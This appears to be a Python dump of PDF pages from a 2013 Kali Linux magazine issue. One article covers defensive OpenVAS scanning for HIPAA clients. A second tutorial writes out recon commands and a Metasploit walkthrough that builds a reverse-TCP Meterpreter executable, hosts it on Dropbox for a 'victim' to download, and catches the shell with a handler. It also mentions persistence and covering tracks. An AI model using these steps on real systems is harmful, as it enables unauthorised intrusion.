\\nposts discussing the same symptoms and of suc -\\ncessful attempts using version 1.0, then applying \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 35}, page_content='Extra 03/2013 36DeFeNSe\\nupdates from there. This is the path I took in order \\nto make progress on the task at hand.\\nSome initial hardware problems were experi -\\nenced due to drawing too much power from the \\nUSB ports. For example, my Apple USB keyboard \\nwas detected by the operating system, but would \\nnot work. This was resolved by using a powered \\nUSB hub to offload the power draw. Trying a differ -\\nent keyboard worked fine without the hub, so your \\nmileage will vary. This is only of concern when ini -\\ntially configuring the RPi. A mouse and keyboard \\nwill not be used when the device is running on the \\nclient’s network. If you need the hub during pro -\\nduction, the Raspberry Pi can be powered off of \\nthe same USB hub adding additional power to the \\nmouse/keyboard. This is how I ran the device dur -\\ning my testing and eliminated the need for an ad -\\nditional power supply.\\nAlso, the default install does not fully utilize the \\nSD card which led to errors due to a full disk when \\nperforming updates. This was resolved by us -\\ning the fdisk followed by the resize2fs  utilities to \\nexpand the system partition to use the remain -\\ning free space. Exact details for this can be found \\nhere:  http://raspberrypi.stackexchange.com/ques -\\ntions/499/how-can-i-resize-my-root-partition .\\nBased on my experience here, some other soft -\\nware housekeeping items are needed (Listing 1)…\\nListing 1.  General Kali updates\\n#apt-get update – performs general software \\nupdates\\n#apt-get install xfce4 xfce4-goodies – installs \\nitems need to support the xserver GUI\\n#apt-get install iceweasel – installs the \\ndefault browser\\nWith the initial hiccups of the installation behind \\nme, the next step was to consider what tools from \\nthe new Kali system would be deployed to perform \\nthe network vulnerability scans. With so many ca -\\npabilities packed into this Linux security distro, \\nthere was no shortage of options.\\nRunning startx  from the command prompt cranks \\nup the desktop interface. Even if we will not normal -\\nly run our scripts and programs from the GUI, it is \\nhelpful to drive the system around a bit to familiarize \\nourselves with the tools loaded on the Kali platform. \\nBe prepared to grab a cup of coffee when first start -\\ning the graphic interface. The slower processing \\npower of the Raspberry box takes a few minutes to \\nload the desktop the first time. Patience is rewarded \\nwith the familiar Kali/Backtrack dragon logo.Selecting a Scanner\\nWith over 300 security tools available on the Ka -\\nli system, we must narrow down which tool (or \\ntools) to use for our purposes. Here are some of \\nthe requirements:\\n•  Scheduled scans for multiple clients,\\n•  lexibility in coniguration,\\n•  available (free) updates to vulnerability deinitions,\\n•  multiple options for reporting output,\\n•  secure transmission of reports (more on this to \\nfollow).\\nLet’s examine these requirements a bit more. Since \\nthe concept here is to create a set of distributed \\nscanners at various client sites, the system must be \\nable to run as a scheduled task and will ultimate -\\nly be called from a master script. Having lexibili -\\nty with its coniguration, the software should adapt \\nwell to changes in solution requirements over time. \\nFreely available vulnerability deinition updates will \\nkeep costs down while allowing the system to de -\\ntect ever-evolving system threats. The tool should \\nprovide multiple options for reporting output. Initially \\nreports will be generated in basic HTML or PDF for -\\nmats, but future requirements will necessitate cap -\\nturing granular scanning data for developing a more \\nsophisticated (eventual) self-service customer por -\\ntal. From a security standpoint, we are not storing \\nePHI; however, we are storing information sensitive \\nto the internal structure and systems of our clients’ \\nnetworks. As such, precautions to secure transmis -\\nsion of reports will be established as part of the so -\\nlution. For the reasons described above, I select -\\ned OpenVAS as the scanning tool for this proof of \\nconcept. No one system will be one hundred per -\\ncent effective all of the time. Certain vulnerabilities \\nwill be missed while some false-positives may be \\nreported. Remember – risk “reduction” is the goal \\nas risk “elimination” is an unreasonable expecta -\\ntion. The important thing is we are using the tool as \\npart of an overall security effort. A more attractive \\noption would be to deploy multiple scanning tools to \\nvalidate the results and cover gaps that exist from \\na single software solution. For the purposes of this \\nphase of the project, we will stick to using a single \\ntool for scanning and reporting.\\nWorking with OpenvAS\\nI ran my out-of-the-box OpenVAS install from the \\ndesktop and fired up the setup script included with \\nthe GUI menu options. After several attempts to \\nconfigure and run scans with no luck, I decided to \\npursue a different course of action. While search -\\ning for set up guides, I can across an invaluable \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 36}, page_content='www.hakin9.org/en 37Kali Scanning for HIPAA\\ntool – the openvas-check-setup  script. While time-\\nconsuming, the script checks out all parts of the \\nOpenVAS system and updates as necessary. I had \\nto do the following based on the fixes recommend -\\ned by the script: Listing 2 and Figure 2.\\nListing 2. Initial updating of OpenVAS\\n#apt-get install openvas-scanner (this updated \\nthe scanner and a good number of other com-\\nponents of the system)\\n#openvasmd –migrate (upgrades the database)\\n#openvas-scapdata-sync (update SCAP feed)\\n#openvas-certdata-sync (update CERT feed)\\n#openvassd (starts the OpenVAS Server)\\n#openvasmd (starts the OpenVAS Manager)\\n#openvasad (starts the OpenVAS Administrator)\\n#gsad (starts the Greenbone Security Assistant)\\nFigure 2.  Migrating the database\\nAfter performing the above, I still go an error stat -\\ning “ERROR: OpenVAS Manager is NOT running!” \\nTo double-check for listening services, I ran the \\ncommand: netstat -A inet –ntlp . As the OpenVAS \\nManager (openvasmd) was found to be listening \\non its default port, I ignored the “error” and pro -\\nceeded with testing (Figure 3).\\nSetting up the Scans\\nThe obligatory disclaimer: I am not an attorney; \\nhowever, I used to work for some. Be sure you have expressed written permission to perform any \\npenetration tests, vulnerability scans, or enumer -\\nation of network services and host information. \\nConducting security scans without permission is \\nagainst the law and not advocated here. For test -\\ning purposes, I have used my home network and \\nmy employer’s network (with permission) to run \\nthe scans. Enough said about that.\\nSetting up a scan is simply a matter of managing \\n(at a minimum): Tasks, Targets, and Scan Configs.\\nTasks – scan jobs made up of the other ele -\\nments. The tasks can be scheduled and leverage \\nEscalators, such as send an email when the task \\nis complete.\\nTargets – IP addresses or ranges of the network \\ndevices to scan. This can be a single Target con -\\nfiguration for a simple network or multiple (servers, \\nworkstations, network devices). Multiple targets \\nwould be useful when it is desirable to customize the \\nlevel of scanning based on different device types.\\nScan Configs – preset vulnerability scan con -\\nfigurations using different levels of scanning tech -\\nniques. As the more intrusive configs can bring \\ndown hosts, use caution when making decisions \\non how and when to run the scans.\\nFor this exercise, I set up three separate scan \\ntargets – our workstation network, our server net -\\nwork, and one for my work computer. I then creat -\\ned three tasks to scan the targets named – “Scan \\nworkstations – Full and fast”, “Scan servers – Full \\nand fast”, and “Scan my PC” respectively. For each \\nof these I used the Full and Fast scan option. This \\nwas the least invasive of the default set of scan \\nconfigurations. The overall process is straightfor -\\nward as the Greenbone Security Desktop interface \\nis intuitive in its layout. Several tabs at the bottom \\nof the application window delineate the various ar -\\neas for configuration.\\nI chose to run the scans manually and did not \\nschedule them. The time required to perform the \\nscans will vary based on the number of hosts being \\nscanned in the current task and the performance \\nof the scanner and network. Just to get an idea of \\nthe traffic generated during a scan, I ran Wireshark \\non my laptop to watch the vulnerability scans. Fur -\\nther analysis of the packets would reveal the mag -\\nic behind the scanning process (Figure 4).\\nHardware Performance\\nLet’s suffice it to say, the performance of the Rasp -\\nberry Pi is underwhelming in this application. This \\nis not unexpected actually and, to a certain degree, \\ninsignificant. While the speed of the scans could \\nbe increased by using faster hardware, we desire \\ninexpensive  and good enough . While scanning, \\nFigure 3.  Checking listening ports for the openvasmd service\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 37}, page_content='Extra 03/2013 38DeFeNSe\\nthe processor hovered around seventy percent uti -\\nlization. Further performance gains would be real -\\nized by running OpenVAS from the command line \\nonly and not from the GUI. In a distributed scanner \\nmodel, the desktop interface would only be used \\non the reporting server. In a real-world application, \\nI would choose to spend a little more on a signifi -\\ncantly faster device (and still stay below $100 per \\nscanner). Some attractive RPi alternatives for the \\nARM processor platform include the Beagle Bone \\nBlack and the Odroid U2.\\nAnalyzing the Results\\nOnce the scan(s) were finished, it was time to eval -\\nuate the results. In this case, we will look at a scan \\non my work laptop (a Windows 7 computer). I used \\nthe HTML version of the report although there are \\nother options including XML, PDF and text.\\nThe Host Summary area of the report provides a \\nhigh-level view of the number of vulnerabilities de -\\ntected and the threat level – High, Medium, or Low. \\nSince I used the Full and Fast scanning option, I as -\\nsumed the threat count would be fairly low. More in -\\nvasive scans would likely show more threats at the \\nexpense of time and higher network activity. For the \\ntest scan, the results show zero High level threats, \\ntwo Medium and seven Low level. A port summary \\nof the detected threats is shown Figure 5.\\nLet’s take a look at one of the Medium level threats. \\nThe same process will be used to examine each \\nthreat to determine a remediation plan for the cli -\\nent. One of the threats detected is called “NVT: DCE \\nServices Enumeration” on TCP port 135. A bit of re -search on the threat shows Windows computers use \\nthis port to look up various services running on a re -\\nmote computer and is used for remote management \\nof the device. The recommendation from the Open -\\nVAS report is to “filter incoming traffic to this port”.\\nFigure 5. OpenVAS HTML Report, Summary Section\\nA potential remediation could be to modify the fire -\\nwall rules on the Windows computer to only allow \\nIP packets sourcing from servers and administrative \\nworkstations. This would reduce the attack vector \\nby blocking connections from peer Windows clients \\non the network (which have no need to communi -\\ncate directly to the device). A comprehensive reme -\\ndiation plan would use a similar approach to ana -\\nlyze each threat identified by the scan. The process \\nof scanning and remediating identified problems will \\nFigure 4.  Greenbone Security Desktop interface\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 38}, page_content='www.hakin9.org/en 39Kali Scanning for HIPAA\\nresult in an overall risk reduction with respect to our \\nclients’ network security (Figure 6). \\nFigure 6. OpenVAS HTML Report, Security Issues\\nCentralized Reporting\\nOpenVAS is designed to leverage remote slave \\nscanners. This allows for the Greenbone Security \\nDesktop and the underlying OpenVAS components \\nto perform the heavy lifting of the remote scanning. \\nThe advantage of this capability is using a single in -\\nterface for scheduling scans and reporting. A cen -\\ntralized OpenVAS server can be used to manage \\nthe entire system. The distributed aspect of the solu -\\ntion will allow my security consulting service to scale \\nefficiently without unneeded visits to client sites. \\nWith direct access to all client reports, I can work di -\\nrectly with our managed services team to implement \\nthe remediations. While certainly a great feature, the \\nproblem with the solution is requiring multiple VPN \\nconnections into the networks of our medical clients. \\nThis risk can be mitigated by using a DMZ for the \\nOpenVAS master server and scheduling the scans \\nin a way where only one client VPN connection is re -\\nquired at a time. Leveraging on-demand VPN con -\\nnections in conjunction with an idle timeout would be \\nthe best configuration to eliminate these concerns.\\nNote\\nDue to the timeline for writing this article, the remote \\nscanning capability of OpenVAS was not tested.\\nFuture enhancements\\nAs with any project like this, there is always room \\nfor improvement. Future requirements to increase \\nremote system capabilities will likely push beyond \\nthe limits of the Raspberry Pi hardware. In that \\ncase, other slightly more expensive hardware so -\\nlutions could be considered without completely re -\\ninventing the wheel. For example, many other SoC \\nsystems are on the market with higher processor \\nspeeds and more memory than the RPi. As these \\ndevices use the same processor family as RPi, it \\nis expected Kali ARM support will enable use of \\nthese more capable hardware systems. Some like -\\nly future enhancements include:\\n•  packet captures of Internet trafic to keep a roll -\\ning history of network activity in the event of a \\nbreach,•  leverage additional scanning tools to validate \\nOpenVAS scans,\\n•  harden the Kali install to protect locally stored \\nvulnerability reports,\\n•  deploy a client self-service portal to view a his -\\ntory of scans and vulnerability remediation.\\nSummary\\nThis project started as a proof of concept to deter -\\nmine the viability of using open source tools like Kali \\nto deploy distributed network vulnerability scanners \\non low-cost hardware. The business case for this so -\\nlution is to provide value-added consulting services \\nto our medical clients and reduce risk as part of a \\ncomprehensive HIPAA compliance program. The ex -\\nperiences outlined here demonstrate that Raspber -\\nry Pi and Kali make an effective hardware/software \\nplatform for network scans. As is to be expected with \\nan open source project, more effort and technical \\nknowledge is required to deploy (and maintain) the \\nsolution; however, the long-term return on investment \\nmakes the endeavor worthwhile. The end goal is to \\nhave a completely automated and low-cost scanning \\nsolution where all parties have direct access to the \\nreports for compliance and remediation purposes. \\nThis proof of concept using Kali shows that the end \\ngoal is certainly within reach.\\nHIPAA Terms\\nCovered Entity – a healthcare provider, a health \\nplan, or healthcare clearinghouse.\\nBusiness Associate – a person or entity that per -\\nforms certain functions or activities that involve the \\nuse or disclosure of protected health information on \\nbehalf of, or provides services to, a covered entity.\\nElectronic Protected Health Information (e-PHI) \\n– individually identifiable health information is \\nthat which can be linked to a particular person. \\nCommon identifiers of health information include \\nnames, social security numbers, addresses, and \\nbirth dates.\\nCHARLIe WATeRS \\nCharlie Waters serves as the Security Oicer \\nand Senior Consultant for Ininity Network \\nSolutions, a Georgia-based MSP irm. His \\nbackground in technology began with an \\nearly curiosity and passion for computing \\nwith a Commodore 64 (at the age of twelve). A hobby turned \\ncareer has led the author on a journey from software develop -\\ner, web programmer/host, systems engineer, and management \\nin the public and private sector, to his current role in technology \\nconsulting. A life-long learner, Charlie maintains the same curi -\\nosity and passion for technology now in a career spanning if -\\nteen years.\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 39}, page_content='Extra 03/2013 40DeFeNSe\\nIn the depth of crisis, hacking over the Internet \\nis still the very big problem, because the rate of \\ntechnology is increasing day by day and every -\\none here is for earning money. In that case some \\nearn the money through bad methods or some \\nby good methods. So, as a hacker I don’t support \\npeople earning money with bad methodologies. \\nNow with the depth of hacking, some big com -\\npanies over the Internet like Facebook, Google, \\nFirefox, and many more opened up a scheme of \\nbug bounties in which hackers from all over the \\nworld are invited to find out a bug or vulnerability \\nin their services, which if found they pay them with \\nhigh bounties for their hard + smart work. To find \\nout those bugs hackers have to use some meth -\\nodologies either based on command line or GUI \\nbased interfaces. Therefore in order to fulfill this \\ndemand of hackers, another type of Operating sys -\\ntem called Kali Linux came into the market which is \\nan extension to Backtrack. Now Kali Linux is very \\nmuch helpful for penetration testing and vulnerabil -\\nity assessments. I am going to show the various \\ntools that can be used for penetration testing and \\nalso for attacking. This guide on Kali Linux will de -\\nscribe both the parts.\\nNow before moving on to the real demonstra -\\ntions let’s just go through some of the definitions \\nand terminologies so that while performing there \\nshould be no dilemma in the minds of the people.What is Kali Linux and what’s its use?\\nNow this question must come in the minds of the \\npeople that what is Kali Linux. Let me just clear this \\nconcept that Kali Linux is a complete re-building of \\nthe Backtrack Linux distributions which is based \\nupon the Debian platform. Now Kali Linux is an ad -\\nvance version of OS which is used for penetration \\ntesting and security auditing Linux distributions. \\nThis is also an open source OS which is available \\nfreely on the Internet. So that anyone can down -\\nload from the Internet. \\nFeatures of Kali Linux\\nSome of the features that makes Kali much more \\ncompatible and useful than any other Linux distri -\\nbutions. \\n•  Kali Linux come up with 300+ penetration test -\\ning tools which are enough to audit any OS, \\nany website or web apps.\\n•  Much more powerful and faster than Backtrack.\\n•  In Backtrack many tools didn’t work which are \\neliminated in Kali.\\n•  Open source and freely available on Internet.\\n•  Kali Linux is much more compatible with wire -\\nless devices.\\n•  Comes in a package of multi languages so that \\nevery person can enjoy assessments in their \\nown language.KALI LINUX\\nA Solution to HACKINg/SeCURITY\\nToday is the world of technology and everyone somehow is \\nattached to it. Some are using the technology for the good \\npurpose and some are using it for bad purposes and Internet \\nis one of those technologies which define both my statements. \\nInternet is being used both by the good (the White Hats) and \\nthe bad (the Black Hats). So, my paper is totally based on the \\nabove line that the OS (Operating System) KALI LINUX (which \\nis an extension to Backtrack) can be used in both the ways \\neither in good things or in bad things. \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 40}, page_content='www.hakin9.org/en 41KALI LINUX – A Solution to HACKINg/SeCURITY\\n•  The packages that are included in the Kali \\nLinux are signed by each individual (GPG sig -\\nnatures).\\n•  It includes the latest patch for injections which \\ncould help the pentesters to do assessments \\non the various wireless techniques \\n•  And many more.\\nLet us have a close look to Kali now.\\nA survey to Kali Linux\\nThe outer look of Kali is pretty much different from \\nany other Linux distributions like backtrack. The \\ndefault username and password to enter into the \\nKali is same as that of backtrack – username – \\nroot and password – toor (Figure 1). This is how exactly the Kali looks when you en -\\nter to the main desktop. Just reject the folders. \\nNow this is my Kali installed in the virtual ma -\\nchine and I am not wasting the time in the instal -\\nlation process because people are smart enough \\nto carry out the installation of any operating sys -\\ntem. So, let’s just focus on our main task. Just \\nlook at the top-right corner of the window it will \\nshow that who is currently logged into your sys -\\ntem (Figure 2).\\nNow moving on to the next, the very first task \\nwhen you enter into the Kali is to check whether \\nthe Internet connection is working fine or not. Be -\\nlow in the snapshot just look at the cursor at the \\ntop right corner showing the wired network which \\nmeans the Internet is working fine in the virtual ma -\\nchine with NAT enabled (Figure 3).\\nNow let’s get familiar with the terminal. In win -\\ndows there is a command prompt from where the \\nwhole system can be assessable, in Linux there \\nis something called as terminal which is a based \\nupon the command line interface from where the \\nwhole system can be viewed. In order to open the \\nterminal just follow the path as – “Applications > \\nAccessories > terminal” and from there you can \\nsimply copy the terminal to the desktop like I did, \\nso that every time the user doesn’t have to go \\nthere, he just come in and click on the terminal to \\naccess it (Figure 4). \\nFigure 1.  The login panel of Kali\\nFigure 2.  The desktop\\nFigure 3.  Showing the Internet connectivity\\nFigure 4. Showing the path to open the terminal\\nFigure 5.  The terminal – a command line interface\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 41}, page_content='Extra 03/2013 42DeFeNSe\\nAnd this is how the terminal looks like (Figure 5).\\nNow let’s get our hands dirty by running some of \\nthe commands in the terminal and let’s get friendly \\nwith the Linux.\\nSome of the important commands which will help \\nthe user to get friendly with Kali:\\n•  In order to run a service in Linux just run \\nservice <name> start . For an instance let’s say \\nI have run a service called apache2 for my lo -\\ncal-host then I will type, “service apache2 \\nstart” (Figure 6). And in order to check wheth -\\ner the service has been successfully started or \\nnot. Just start your Internet browser and write \\n“127.0.0.1” which is a loopback address which shows the successful working of the Apache \\nserver (Figure 7).\\n•  In order to open the Internet browser through \\nthe terminal, just enter “Firefox &” and it will \\nopen the browser and also shows that what ex -\\nactly the PID (process ID) for this browser pro -\\ncess has been allocated (Figure 8). \\n•  If the root wants to change the password of his \\naccount, he can simply do it by entering the \\ncommand, “passwd” and enter the password it \\nwill change the password from default “toor” to \\nsay “123” (Figure 9)\\nTill now we have seen some of the important \\ncommands which make a user friendly with the \\nLinux terminal. Some more commands which are \\nvery helpful for any user to get started with the \\nLinux and those are:\\n•  ls – list the iles and folders of the current di -\\nrectory\\n•  cd – change directory\\n•  touch – to make a ile\\n•  mkdir – to create a directory\\n•  rm – removes the iles, rm -R removes iles \\nand directories\\n•  rmdir – removes the empty directories\\n•  man – open the manual for the commands\\n•  time – to see the current time\\nFigure 6.  Showing to start the apache2 service\\nFigure 7.  Shows Apache is successfully running\\nFigure 10. Exploring the tools\\nFigure 9.  Changing root default password\\nFigure 8.  Showing to open the Firefox browser\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 42}, page_content='www.hakin9.org/en 43KALI LINUX – A Solution to HACKINg/SeCURITY\\n•  date – shows the current \\n•  nano – another editor for the creation and edit -\\ning of the iles.\\nNow these are some of the most important com -\\nmands which will help any user in the further \\nprocess. Now let us just get back to our main \\nmotive but before irst let me make everyone fa -\\nmiliar with some of the terminologies which will \\nhelp everyone to understand the basic concept \\nbehind the scene.\\nNow in order to begin with any kind of hacking \\nevery person has to go through some phases and \\nthose phases are knows as the hacking phases \\nand those are:\\nSteps Performed by Hackers:\\nThere are only five steps in order to hack anything \\nin this world:\\n•  Information Gathering\\n•  Scanning\\n•  Gaining Access\\n•  Maintaining Access\\n•  Covering Tracks\\nIn order to explore more about these hacking \\nsteps let’s just check from where all the tools can \\nbe accessed in GUI interface (Figure 10). \\nNow there are more than 300+ tools in Kali Linux \\nwhich will help to acquire the remote systems, \\ngenerating your own payloads, addition of latest \\nexploits, scanning process and much more. Now \\nit is not possible for me also to explore each and \\nevery tool in the tool list but what I am going to do \\nhere is sticking to the main concept and will going \\nto show the main tools which will make a person \\nfamiliar with the Kali and it will also make them free \\nto use the tools of their own.\\nInformation gathering\\nthe very first step in order to gather each and ev -\\nery information about the target, only then a tes -\\nter can examine the whole bunch of vulnerabili -\\nties and can patch them easily and safely. Now \\nthe major source of gathering the information is \\nGoogle which is an open source and is available \\nfor each person. But the information gathering de -\\npends upon:\\n•  Active gathering- which completely means a \\nuser is interacting with the target directly. For \\nan instance – making a phone call to a friend \\nworking in the target company and gathering \\nthe information by spooing your own friend.•  Passive gathering – in which a user is not di -\\nrectly interacting with the target means collect -\\ning the information from search engines like \\nGoogle or Bing (Figure 11). \\nNow the main task is to gather the IP (Internet \\nProtocol) address which is a 32-bit unique num -\\nber and is being assigned to everyone. The best \\nmethod is to ping a website and gather the IP ad -\\ndress. Although the ping is used for checking the \\nwhether the host is alive or not but here we are \\nquite stick to our own method. So, if your target is \\nFigure 13.  Options in Dmitry\\nFigure 12.  Acquiring the IP address of a particular website\\nFigure 11.  Gathering information from Google\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 43}, page_content='Extra 03/2013 44DeFeNSe\\nwebsite simply ping <website name>  and copy the \\nIP address (Figure 12).\\nNow the next information gather is to check for \\nthe: \\n•  reverse look up\\n•  DNS information\\n•  IP address \\n•  and type of target\\nNow in Kali there is only tool which can give you \\nall these results, and you don’t have your Inter -\\nnet every time to go a website and start search -\\ning for the results. The tool that I am using here is \\n“dmitry” which is completely based on command \\nline but very easy to use and even give the results \\nfaster and accurate.\\nSo in order to use dmitry simply run the following \\ncommand (Figure 13-15):\\n<dmitry –winsepfb –t 0-9 –e IP>\\nNow in this particular scan I have targeted the \\nGoogle and it shows the scan results that all the \\n150 ports are in a closed state. You can simply \\nput as many as options you want.Scanning\\nThe second most important phase to find out the \\nservices that are vulnerable, the open ports, and \\nmany other types of types of services which are \\nvulnerable in windows, websites, routers, and net -\\nworks etc. therefore, scanning is broadly divided \\ninto major three parts:\\n•  Port scanning: In this method the attacker will \\nsend a number of messages to break into the \\ncomputer so that he can get the information \\nabout the computer’s network.\\n•  Network Scanning: To check the number of ac -\\ntive hosts on the network.\\n•  Vulnerability scanning: Means to check the \\nweaknesses in the target so that it attacker us -\\nes those to gain the access of the target\\nSo now I am going to use the universal vulner -\\nability scanner which gives the best output for \\nscanning process and is an open source avail -\\nable freely on the Internet and the tool known is \\nnmap which is responsible a number of inger -\\nprinting, service ingerprinting and numerous \\nTCP scan, stealth scan, UDP scan, PORT scan \\nand many more. \\nFigure 14.  Running Dmitry against Google\\nFigure 17.  TCP scans\\nFigure 16.  Invoking the nmap in the terminal\\nFigure 15.  Results of the Dmitry scan\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 44}, page_content='www.hakin9.org/en 45KALI LINUX – A Solution to HACKINg/SeCURITY\\nStep 1\\nInvoke the nmap by running the command “nmap” \\n(Figure 16).\\nStep 2\\nCheck for TCP SCAN. Command used is: namp \\n-sT IPaddress (Figure 17).\\nexploitation\\nGaining Access or exploitation means to acquire \\nany computer system, control panel of any website \\nor any network without someone’s permission. The \\nattacker in this phase attacks on the systems to \\ngain the access and steals the important informa -\\ntion about the company which he wants to exploit. \\nThe exploit can occur in LAN (Local Area Network), \\nin a WAN (Wide Area Network) and also it can also \\noccur offline like REVERSE ENGINEERING, Buf -\\nfer Overflow Attacks, Password Filtering etc. \\nNow in this particular phase I am going to exploit \\nmy own WIN-7 just to show how the exploitation \\ncan be done through Kali Linux in much faster way \\nthan Backtrack.\\nBefore going deep into the exploitation let me \\nclear some of the basic terminologies so that there \\nshould be no confusion while going through attack -\\ning phase.\\n•  Threat: A threat is potential violation of the se -\\ncurity.\\n•  Vulnerability: It is the weakness in the design of \\nan application or any website that can lead to \\ncompromising with the security of the system or \\nthe network or any web based application.\\n•  Attack: To set up a violence force.\\n•  Exploit: It means to breach the security of the \\nIT (Info. Tech.) System through the vulnerabili -\\nty.\\n•  Payload: Payloads in computer security are re -\\nlated to malicious iles (generally .exe) which \\nperform malicious activity.\\n•  Reverse TCP connection: A reverse connec -\\ntion actually made to bypass the restrictions \\nthat the irewall has applied on the open ports. \\nA irewall actually blocks the incoming trafic \\nthrough the open ports but could not block the \\noutgoing trafic. So, the attacker use this way \\nto bypass the security restrictions.\\nThings Required\\n•  KALI LINUX UPDATED METASPLOIT.\\n•  An intermediate to upload your payload (I am \\nusing DROPBOX and SHARE FOLDER of KA -\\nLI LINUX).Brief Description about the Metasploit\\nMetasploit (also known as MS) is basically an open \\nsource framework that contains all the exploits, \\npayloads, helpful in penetration testing and also \\nhelpful in IDS signature development. MSF actual -\\nly contains the database of the exploit codes which \\nwhen hit on any PC inside or outside the network \\nwith the concerned vulnerabilities, produce a shell \\nat that targeted PC and returns back to the attack -\\ner’s machine.\\nSo, let’s get started with the exploitation phase: \\n•  Open up the terminal and invoke the Metasploit \\nconsole by running the command called \\nmsfconsole  and wait for 1-2 minutes as it takes time \\nto load all the payloads, exploits etc (Figure 18). \\nFigure 20.  Executing the exploit to run\\nFigure 19. Generating a payload for back connection\\nFigure 18. Invoking the Metasploit Terminal\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 45}, page_content='Extra 03/2013 46DeFeNSe\\n•  And in the mean while till the msfconsole gets \\nopened, open up a new terminal to create a \\npayload which will help to create a back con -\\nnection, and in order to create a payload enter \\nthe following command (Figure 19): msfpayload \\nwindows/meterpreter/reverse _ tcp lhost=Kali \\nIP address lport=4444 x > /root/Desktop/\\nbackconnection.exe  \\n•  Now upload it anywhere on the Internet to ex -\\nploit and here I am uploading it in dropbox just \\nfor demonstration.\\n•  Now coming back to the Metasploit console \\nand run the following commands step by step.\\n•  Write the command – use exploit/multi/handler  \\nand press enter” (Figure 20)\\n•  Set a payload by writing the command (Figure \\n21): set payload Windows/vncinject/reverse _ tcp\\n•  Set the LHOST (LOCAL HOST) – set lhost \\n192.168.40.128  (KALI IP address) (Figure 22)\\n•  Then Just set for the exploit – “exploit” (Figure 23)\\n•  Now as soon as The VICTIM download your \\nvulnerable payload ile from the INTERNET \\nyou will get the back connection of his/her PC \\n(Figure 24 and Figure 25)\\nMaintaining Access\\nMaintaining Access is an important phase after \\ngaining the access to any computer system. In \\nthis step the attacker leaves himself an easier way in order to come back to into the system lat -\\ner. By this step of hacking an attacker can come \\nto the gained system anytime even if the service \\nhe exploited is patched. The Metasploit Persis -\\ntent Meterpreter Service is what an attacker usu -\\nally uses, but there’s warning when you use this \\npersistent Meterpreter requires no authentication. \\nBut this will have a problem. Any other attacker \\nwho uses the same service will also have the \\nsame port address to maintain the access which \\nis not a right thing. \\nCovering tracks\\nCovering tracks is a last phase of hacking. Cover -\\ning tracks refers to the actions that are being un -\\ndertaken by an attacker to widen his exploitation of \\nthe system without being detected. Now the rea -\\nson behind covering tracks is to be on the safer \\nside and also include the prolonged stay and con -\\ntinued use of resources. \\nConclusion\\nIn the end I would only like to conclude that in \\nthe depth of crisis, hacking over the INTERNET \\nis still a very big problem. Some hackers do it for \\nthe sake of fun or some do it for the sake of tak -\\ning revenge. Therefore, KALI is the solution of all \\nthese answers. Kali can be used as an OS for \\npenetration testing which could help the security \\nFigure 21.  Executing the payload\\nFigure 24.  Victim tried to install our payload \\nFigure 23.  Setting up the exploit in msfconsole\\nFigure 22.  Setting up the LHOST\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 46}, page_content='KALI LINUX – A Solution to HACKINg/SeCURITY\\nresearchers and analysts to find out the bugs in \\nvarious networks or OS so that they can become \\nsecure to some extent.\\nFigure 25.  Successfully got the Windows Shell on my KALI \\nLINUXDeePANSHU KHANNA\\nLinux Security Researcher, \\nMr. Deepanshu Khanna, a Young Linux Security Expert from \\nLudhiana, Punjab (India), is Linux Security Researcher & Pen -\\netration Tester at “Prediqnous – Cyber Security & IT Intelli -\\ngence”. Currently, he is pursuing his B.Tech. in Computer Sci -\\nence from Lovely Professional University (LPU). He managed \\nWeb Penetration testing, performed network analysis, Exploit \\nmaking, Nessus Complete Security, IDS and Linux Security, \\nwhich leads him to join Prediqnous Team. He has delivered his \\nknowledge through Seminars and Workshops across India. \\nHe gives training to the students for IT Security & Ethical Hack -\\ning. He found and reported many vulnerabilities and phishing \\nscams to IT Dept. of India. He aims to get applauses from oth -\\ner experts of IT industry for his research work on IT Security.\\nEmail: khannadeepanshu34@yahoo.in\\nMobile Number: +91-9779903383\\nadvertisement'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 47}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 48}, page_content='IN SOME CASES\\nnipper studio\\nHAS VIRTUALLY\\nREMOVED\\nMANUAL AUDIT\\nCISCO SYSTEMS INC.theNEED FOR a\\nTitania’s award winning Nipper Studio coniguration \\nauditing tool is helping security consultants and end-\\nuser organizations worldwide improve their network \\nsecurity. Its reports are more detailed than those typically \\nproduced by scanners, enabling you to maintain a higher \\nlevel of vulnerability analysis in the intervals between \\npenetration tests. \\nNow used in over 45 countries, Nipper Studio provides a \\nthorough, fast & cost effective way to securely audit over \\n100 different types of network device. The NSA, FBI, DoD \\n& U.S. Treasury already use it, so why not try it for free at \\nwww.titania.com\\nwww.titania.com\\nUPDA TE\\nNOW WITH\\nSTIG\\nAUDITING'),\n",
